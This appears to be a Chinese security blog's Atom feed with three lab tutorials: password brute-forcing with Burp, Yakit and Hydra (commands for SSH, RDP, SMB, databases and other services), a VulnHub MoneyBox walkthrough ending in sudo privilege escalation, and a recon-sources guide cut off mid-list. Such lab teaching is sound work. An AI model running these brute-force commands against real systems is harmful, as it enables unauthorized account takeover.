<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>baiQstar的博客</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-01-07T12:32:30.216Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>白易安</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>三十五，密码爆破</title>
    <link href="http://example.com/2024/01/07/%E4%B8%89%E5%8D%81%E4%BA%94%EF%BC%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"/>
    <id>http://example.com/2024/01/07/%E4%B8%89%E5%8D%81%E4%BA%94%EF%BC%8C%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/</id>
    <published>2024-01-07T11:10:16.000Z</published>
    <updated>2024-01-07T12:32:30.216Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="目录">目录:</span></h4><p>&emsp;<strong>环境搭建</strong><br>&emsp;&emsp;<strong>1，PHPstudy创建一个新网站</strong><br>&emsp;&emsp;<strong>2，下载靶场文件</strong><br>&emsp;&emsp;<strong>3，修改配置文件</strong><br>&emsp;&emsp;<strong>4，打开网页并进行初始化</strong><br>&emsp;&emsp;<strong>5，靶场搭建成功</strong><br>&emsp;<strong>burp密码爆破</strong><br>&emsp;&emsp;<strong>1，拦截靶场</strong><br>&emsp;&emsp;<strong>2，burp中开启拦截</strong><br>&emsp;&emsp;<strong>3，在网页中随便输入账号密码，并点击Login</strong><br>&emsp;&emsp;<strong>4，burp拦截发送的数据包，并右键发送到intruder中</strong><br>&emsp;&emsp;<strong>5，设置修改位置</strong><br>&emsp;&emsp;<strong>6，设置payload</strong><br>&emsp;&emsp;<strong>7，开始攻击</strong><br>&emsp;<strong>Yakit密码爆破</strong><br>&emsp;&emsp;<strong>1，拦截靶场</strong><br>&emsp;&emsp;<strong>2，在网页中随便输入账号密码并输入正确的验证码，点击Login</strong></p><p>&emsp;&emsp;<strong>3，在Yakit中将劫持到的数据包右键发送到webfuzzer</strong><br>&emsp;&emsp;<strong>4，设置字典</strong><br>&emsp;&emsp;<strong>5，发送请求</strong><br>&emsp;<strong>Hydra密码爆破</strong><br>&emsp;&emsp;<strong>1，介绍</strong><br>&emsp;&emsp;<strong>2，参数</strong><br>&emsp;&emsp;<strong>3，查看参数版本等信息</strong><br>&emsp;&emsp;<strong>4，爆破SSH</strong><br>&emsp;&emsp;<strong>5，使用字典爆破</strong><br>&emsp;&emsp;<strong>6，Hydra爆破常见服务</strong></p><h4><span id="环境搭建">环境搭建</span></h4><h5><span id="1phpstudy创建一个新网站">1，PHPstudy创建一个新网站</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071918751.png" alt="image-20240107191806298"></p><h5><span id="2下载靶场文件">2，下载靶场文件</span></h5><p>在网站的根目录下载pikachu-master.zip并解压</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071919938.png" alt="image-20240107191953403"></p><h5><span id="3修改配置文件">3，修改配置文件</span></h5><p>修改C:\phpStudy_64\pikachu\WWW\pikachu-master\pikachu-master\inc下的config.inc.php文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071922485.png" alt="image-20240107192212005"></p><p>修改为自己数据库的账号和密码</p><h5><span id="4打开网页并进行初始化">4，打开网页并进行初始化</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071923262.png" alt="image-20240107192354783"></p><h5><span id="5靶场搭建成功">5，靶场搭建成功</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071925050.png" alt="image-20240107192520712"></p><br><br><h4><span id="burp密码爆破">burp密码爆破</span></h4><h5><span id="1拦截靶场">1，拦截靶场</span></h5><p>打开burp—-&gt;代理—-&gt;打开内嵌浏览器</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071933153.png" alt="image-20240107193338933"></p><p>复制网址到内嵌浏览器中打开</p><h5><span id="2burp中开启拦截">2，burp中开启拦截</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071935984.png" alt="image-20240107193525182"></p><h5><span id="3在网页中随便输入账号密码并点击login">3，在网页中随便输入账号密码，并点击Login</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071937960.png" alt="image-20240107193748253"></p><h5><span id="4burp拦截发送的数据包并右键发送到intruder中">4，burp拦截发送的数据包，并右键发送到intruder中</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071937678.png" alt="image-20240107193732767"></p><h5><span id="5设置修改位置">5，设置修改位置</span></h5><p>先点击清除payload位置</p><p>拉住输入的用户名并点击添加payload位置</p><p>拉住输入的密码并点击添加payload位置</p><p>攻击类型选择多个payload集合</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071941985.png" alt="image-20240107194127591"></p><br><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071942893.png" alt="image-20240107194243185"></p><h5><span id="6设置payload">6，设置payload</span></h5><p>点击payload</p><p>payload集选择1也就是我们添加的第一个—-用户名</p><p>在清单中加入可用的用户名，也可以导入文件或使用burp自带的字典</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071944688.png" alt="image-20240107194448573"></p><p>payload集选择2也就是我们添加的第二个—-密码</p><p>在清单中加入可用的密码，也可以导入文件或使用burp自带的字典</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071947599.png" alt="image-20240107194748639"></p><h5><span id="7开始攻击">7，开始攻击</span></h5><p>点击开始攻击等待到弹窗底部显示已完成即可</p><p>点击长度找出响应包大小不同的数据包</p><p>点击Response—-&gt;页面渲染可以看到Login success的字样显示登录成功</p><p>在上方可以看到用户名为admin,密码为123456</p><p>爆破成功！</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071950110.png" alt="image-20240107195015431"></p><br><br><h4><span id="yakit密码爆破">Yakit密码爆破</span></h4><h5><span id="1拦截靶场">1，拦截靶场</span></h5><p>点击MITM—-&gt;免配置启动—-&gt;免配置启动—-&gt;打开chrome浏览器</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071957170.png" alt="image-20240107195742939"></p><p>复制靶场的网址到chrome浏览器中打开,并点击手动劫持</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401071959934.png" alt="image-20240107195936801"></p><h5><span id="2在网页中随便输入账号密码并输入正确的验证码点击login">2，在网页中随便输入账号密码并输入正确的验证码，点击Login</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072001542.png" alt="image-20240107200111421"></p><h5><span id="3在yakit中将劫持到的数据包右键发送到webfuzzer">3，在Yakit中将劫持到的数据包右键发送到webfuzzer</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072004622.png" alt="image-20240107200427562"></p><h5><span id="4设置字典">4，设置字典</span></h5><p>在webfuzzer中将填入的账号密码删除并右键插入模糊测试字典标签，并设置对应的字典</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072006089.png" alt="image-20240107200605762"></p><br><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072008065.png" alt="image-20240107200758880"></p><h5><span id="5发送请求">5，发送请求</span></h5><p>点击发送请求，等待至右侧的成功250完成</p><p>点击响应大小找出响应包大小不同的数据包</p><p>点击响应—-&gt;渲染可以看到Login success的字样显示登录成功</p><p>在上方可以看到用户名为admin,密码为123456</p><p>爆破成功！</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072011068.png" alt="image-20240107201132935"></p><br><br><h4><span id="hydra密码爆破">Hydra密码爆破</span></h4><h5><span id="1介绍">1，介绍</span></h5><p>Hydra也叫九头蛇，是一款开源的暴力PJ工具，集成在kali当中。</p><h5><span id="2参数">2，参数</span></h5><ul><li><p>-l 指定用户名</p></li><li><p>-p 指定密码</p></li><li><p>-L 指定用户名字典</p></li><li><p>-P 指定密码字典</p></li><li><p>-C 指定所用格式为“user:password”的字典文件</p></li><li><p>-e</p><ul><li>n null，表示尝试空密码</li><li>s same，把用户名本身当做密码进行尝试</li><li>r 反向，把用户名倒叙，当做密码进行尝试。</li></ul></li><li><p>-vV 显示执行细节</p></li><li><p>-o 保存执行结果</p></li><li><p>-s 指定非默认端口</p></li><li><p>-M 指定破解的目标文件，如果不是默认端口，后面跟上“:port”</p></li><li><p>-t 指定爆破时的任务数量（默认16）</p></li></ul><h5><span id="3查看参数版本等信息">3，查看参数版本等信息</span></h5><p>在kali中打开终端，直接输入hydra，可以看到hydra的版本、参数、以及可以爆破的协议。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072020428.png" alt="image-20240107202017242"></p><p>从图中圈起来的地方可以看到，hydra可以爆破 http、ftp、mysql等多种协议。</p><h5><span id="4爆破ssh">4，爆破SSH</span></h5><p>用 -l 参数指定用户名，-p参数指定密码，后面直接跟目标的IP地址和协议。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -p 12345678 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p>成功的话，会把账号和密码高亮显示出来。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072021839.png" alt="image-20240107202132763"></p><p>也可以使用另外一种格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -p 12345678 ssh://192.168.31.173</span><br></pre></td></tr></table></figure><p>执行的结果都是一样的。</p><p>这里主要简单介绍一下用法，很多时候，我们是不知道密码的，所以就要使用密码字典来爆破。</p><h5><span id="5使用字典爆破">5，使用字典爆破</span></h5><p>小写的 -p 是指定密码，大写的 -P是指定字典文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P 密码字典 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p>1）我们先准备一个简单的密码字典，创建一个 pwd.txt 文件，在里面输入几个简单的密码：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072023152.png" alt="image-20240107202334710"></p><p>2）然后指定这个密码字典：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P pwd.txt 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p>可以看到爆破成功了，但只给了一个结果：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072024712.png" alt="image-20240107202412543"></p><p>3）如果想看爆破的过程，可以加上 -vV参数，显示执行细节：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P pwd.txt 192.168.31.173 ssh -vV</span><br></pre></td></tr></table></figure><p>我们的密码字典中有三个密码，它也会执行三次，并把执行过程列了出来。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072024456.png" alt="image-20240107202453427"></p><p>4）上面的密码字典使用的是相对路径，我们也可以把它换成绝对路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P /root/pwd.txt 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401072025116.png" alt="image-20240107202524829"></p><p>SSH协议的默认用户是 root，所以上面我们都是指定的用户名，如果不确定用户名，就要指定用户名字典，比如下面这种格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L /root/usr.txt -P /root/pwd.txt 192.168.31.173 ssh</span><br></pre></td></tr></table></figure><p>爆破其他协议服务时，把协议名和默认用户名换一下就可以了。</p><h5><span id="6hydra爆破常见服务">6，Hydra爆破常见服务</span></h5><p>远程桌面（RDP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P 密码字典 192.168.31.173 rdp</span><br></pre></td></tr></table></figure><p>共享文件（SMB）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l administrator -P 密码字典 192.168.31.173 smb</span><br></pre></td></tr></table></figure><p>文件传输（FTP）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 ftp</span><br></pre></td></tr></table></figure><p>邮箱协议（POP3）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 pop3</span><br></pre></td></tr></table></figure><p>MSSQL数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l sa -P 密码字典 192.168.31.173 mssql</span><br></pre></td></tr></table></figure><p>MySQL数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 mysql</span><br></pre></td></tr></table></figure><p>Oracle数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 oracle</span><br></pre></td></tr></table></figure><p>Redis数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码字典 192.168.31.173 redis</span><br></pre></td></tr></table></figure><br><br><br><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;目录&quot;&gt;目录:&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;&amp;emsp;&lt;strong&gt;环境搭建&lt;/strong&gt;&lt;br&gt;&amp;emsp;&amp;emsp;&lt;strong&gt;1，PHPstudy创建一个新网站&lt;/strong&gt;&lt;br&gt;&amp;emsp;&amp;emsp;&lt;strong&gt;2，下</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十四，vulnhub-MONEYBOX: 1</title>
    <link href="http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E5%9B%9B%EF%BC%8Cvulnhub-MONEYBOX-1/"/>
    <id>http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E5%9B%9B%EF%BC%8Cvulnhub-MONEYBOX-1/</id>
    <published>2024-01-04T12:38:29.000Z</published>
    <updated>2024-01-04T13:51:50.585Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="搭建环境">搭建环境</span></h4><h5><span id="1下载oracle-vm-virtualbox">1，下载Oracle VM VirtualBox</span></h5><p>下载地址：<a href="https://www.virtualbox.org/wiki/Downloads">https://www.virtualbox.org/wiki/Downloads</a></p><h5><span id="2下载靶机vulnhub-moneybox-1">2，下载靶机vulnhub-MONEYBOX: 1</span></h5><p>下载地址：<a href="http://www.vulnhub.com/entry/moneybox-1,653/#download">http://www.vulnhub.com/entry/moneybox-1,653/#download</a></p><h5><span id="3安装配置">3，安装配置</span></h5><p>点击管理—-》导入虚拟电脑—-》选择靶机的MoneyBox.ova文件—-》下一步—-》导入</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042044093.png" alt="image-20240104204421298"></p><p>右键虚拟机—-》设置—-》USB设备—-》选择USB 1.1控制器</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042045734.png" alt="image-20240104204504640"></p><p>点击网络—-》将连接方式改为仅主机网络—-》选择默认的界面名称—》记住MAC地址</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042046617.png" alt="image-20240104204646397"></p><p>打开VMware—-》点击编辑—-》虚拟网络编辑器—-》更改设置—-》选择桥接模式—-》改为VirtualBox Host-Only模式</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042049124.png" alt="image-20240104204949544"></p><p>打开CTF虚拟器和kali虚拟机</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042051748.png" alt="image-20240104205158324"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042053178.png" alt="image-20240104205337342"></p><hr><h4><span id="做题步骤">做题步骤</span></h4><h5><span id="1获取靶机的ip">1，获取靶机的IP</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig获取kali的IP</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042059315.png" alt="image-20240104205943848"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.56.103/24获取局域网内存活的IP与靶机的mac地址对比便可获得靶机的IP</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042105902.png" alt="image-20240104210549560"></p><h5><span id="2扫描靶机的端口">2，扫描靶机的端口</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-1000 192.168.56.101</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042107489.png" alt="image-20240104210745149"></p><p>可以看出靶机开放了21，22，80端口，测试这几个端口有没有漏洞</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 21,22,80 -sC 192.168.56.101</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042109558.png" alt="image-20240104210948264"></p><p>发现ftp拥有允许匿名ftp登录的漏洞，Anonymous:Anonymous可登录，并且还有一个图片：trytofind.jpg</p><h5><span id="3在80端口寻找线索">3，在80端口寻找线索</span></h5><p>浏览器打开IP</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042112799.png" alt="image-20240104211212350"></p><p>找不到东西，目录爆破试一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u &quot;http://192.168.56.101&quot;  -x403,404,401</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042114703.png" alt="image-20240104211425548"></p><p>找到一个blogs页面，打开在源代码中看到线索还有个页面</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042116995.png" alt="image-20240104211630460"></p><p>打开该页面，检测页面源代码发现一个密钥，暂时还看不出在哪里用</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042117996.png" alt="image-20240104211746618"></p><h5><span id="4登录ftp对图片进行检查">4，登录ftp，对图片进行检查</span></h5><p>刚扫描端口时发现有ftp的匿名登录漏洞，尝试登录一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ftp 192.168.56.101</span><br><span class="line">用户名：Anonymous</span><br><span class="line">密码：Anonymous</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042121944.png" alt="image-20240104212103592"></p><p>help查看一下有哪些命令</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042122457.png" alt="image-20240104212225318"></p><p>发现有ls命令，查看一下有哪些文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042123985.png" alt="image-20240104212346879"></p><p>发现只有一张图片trytofind.jpg，刚上面还发现了有get命令，将图片下载下来</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042125433.png" alt="image-20240104212523207"></p><p>查看图片</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042128343.png" alt="image-20240104212856995"></p><p>发现看不出什么信息，可以用steghide查看一波</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide info trytofind.jpg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042131965.png" alt="image-20240104213152418"></p><p>这里让输入密钥，刚刚找出的密钥应该就是用在这里</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042133927.png" alt="image-20240104213315451"></p><p>发现这张图片中藏了一个data.txt文件，分离出来看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide  extract -sf trytofind.jpg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042135656.png" alt="image-20240104213509564"></p><p>可以看出靶机的名称为renu</p><h5><span id="5对靶机进行ssh密码爆破">5，对靶机进行ssh密码爆破</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l renu -P 1.txt 192.168.56.101 ssh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042136391.png" alt="image-20240104213650338"></p><p>爆破出密码进行ssh远程登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh renu@192.168.56.101</span><br><span class="line">987654321</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042138632.png" alt="image-20240104213759528"></p><p>登录成功，查看有哪些文件，寻找flag</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042139641.png" alt="image-20240104213903358"></p><p>成功拿到第一个flag</p><h5><span id="6查看历史命令寻找flag线索">6，查看历史命令，寻找flag线索</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat .bash_history</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042140374.png" alt="image-20240104214045043"></p><p>通过历史命令可以看出，曾经登录过lily用户，我们也尝试登录一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh lily@192.168.56.101</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042145871.png" alt="image-20240104214522004"></p><p>也是能够成功登录，查看有哪些文件，找到第二个flag</p><h5><span id="7提权寻找第三个flag">7，提权，寻找第三个flag</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure><p>发现可以sudo来运行perl</p><p>在<a href="https://gtfobins.github.io/%E7%BD%91%E9%A1%B5%E4%B8%AD%E6%89%BE%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E5%91%BD%E4%BB%A4">https://gtfobins.github.io/网页中找到提权的命令</a></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042148982.png" alt="image-20240104214811854"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042151657.png" alt="image-20240104215102182"></p><p>成功找到第三个flag</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;搭建环境&quot;&gt;搭建环境&lt;/span&gt;&lt;/h4&gt;&lt;h5&gt;&lt;span id=&quot;1下载oracle-vm-virtualbox&quot;&gt;1，下载Oracle VM VirtualBox&lt;/span&gt;&lt;/h5&gt;&lt;p&gt;下载地址：&lt;a href=&quot;https://www.</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十三，信息收集</title>
    <link href="http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <id>http://example.com/2024/01/04/%E4%B8%89%E5%8D%81%E4%B8%89%EF%BC%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</id>
    <published>2024-01-04T11:33:14.000Z</published>
    <updated>2024-01-04T12:34:14.660Z</updated>
    
    <content type="html"><![CDATA[<h4><span id="简介">简介</span></h4><p>渗透的本质是信息收集，信息收集也叫做资产收集</p><p>信息收集是渗透测试的前期主要工作，是非常重要的环节，收集足够多的信息才能方便接下来的测试，信息收集主要是收集网站的域名信息、子域名信息、目标网站信息、目标网站真实IP、敏感&#x2F;目录文件、开放端口和中间件信息等等。通过各种渠道和手段尽可能收集到多的关于这个站点的信息，有助于我们更多的去找到渗透点，突破口。</p><h4><span id="信息收集的分类">信息收集的分类</span></h4><p>1，服务器的相关信息（真实ip，系统类型，版本，开放端口，WAF等）</p><p>2，网站指纹识别（包括，cms，cdn，证书等） dns记录</p><p>3，whois信息，姓名，备案，邮箱，电话反查（邮箱丢社工库，社工准备等）</p><p>4，子域名收集，旁站，C段等</p><p>5，google hacking针对化搜索，word&#x2F;电子表格&#x2F;pdf文件，中间件版本，弱口令扫描等</p><p>6，扫描网站目录结构，爆后台，网站banner，测试文件，备份等敏感文件泄漏等</p><p>7，传输协议，通用漏洞，exp，github源码等</p><h4><span id="常见的查询方法">常见的查询方法</span></h4><h5><span id="1whois查询">1，whois查询</span></h5><p>whois是用来查询域名的IP以及所有者等信息的传输协议。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、联系邮箱、联系电话、更新时间、创建时间、过期时间、域名服务器、DNS等等），不同域名后缀的Whois信息需要到不同的Whois数据库查询。</p><p>微步在线：<a href="https://x.threatbook.com/">https://x.threatbook.com/</a></p><p>站长之家域名WHOIS信息查询地址 <a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p><p>爱站网域名WHOIS信息查询地址 <a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>腾讯云域名WHOIS信息查询地址 <a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>美橙互联域名WHOIS信息查询地址 <a href="https://whois.cndns.com/">https://whois.cndns.com/</a></p><p>爱名网域名WHOIS信息查询地址 <a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a></p><p>易名网域名WHOIS信息查询地址 <a href="https://whois.ename.net/">https://whois.ename.net/</a></p><p>中国万网域名WHOIS信息查询地址 <a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p><h5><span id="2在线网站备案查询">2，在线网站备案查询</span></h5><p>网站备案信息是根据国家法律法规规定，由网站所有者向国家有关部门申请的备案，如果需要查询企业备案信息（单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等），推荐以下网站查询</p><p>天眼查<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>爱站备案查询<a href="https://icp.aizhan.com/">https://icp.aizhan.com/</a></p><p>域名助手备案信息查询<a href="http://cha.fute.com/index">http://cha.fute.com/index</a></p><h5><span id="3查询真实主机ip">3，查询真实主机IP</span></h5><p>因为许多大型的网站都有CDN服务，要查询确认源站主机的IP，主要是通过全球ping和国外ping来实现，基本上国外大多数相同的地址就是主机的IP地址，确认IP后可以在最后一位进行10以内的加减来寻找临近IP资产</p><p>站长之家ping：<a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></p><p>ITDOG的ping：<a href="https://www.itdog.cn/ping/baidu.com">https://www.itdog.cn/ping/baidu.com</a></p><p>IPIP的ping：<a href="https://tools.ipip.net/ping.php">https://tools.ipip.net/ping.php</a></p><h5><span id="4收集子域名">4，收集子域名</span></h5><p>收集子域名可以扩大测试范围，同一域名下的二级域名都属于目标范围。</p><p>子域名在线爆破：<a href="http://z.zcjun.com/">http://z.zcjun.com/</a></p><p>Layer子域名挖掘机</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401042006444.png" alt="image-20240104200642598"></p><p>空间探测：</p><p>fofa:<a href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></p><p>360:<a href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></p><p>奇安信：<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><p>钟馗之眼：<a href="https://www.zoomeye.org/business">https://www.zoomeye.org/business</a></p><p>shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p>CensysSearch:<a href="https://search.censys.io/">https://search.censys.io/</a></p><p>谷歌hacking：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 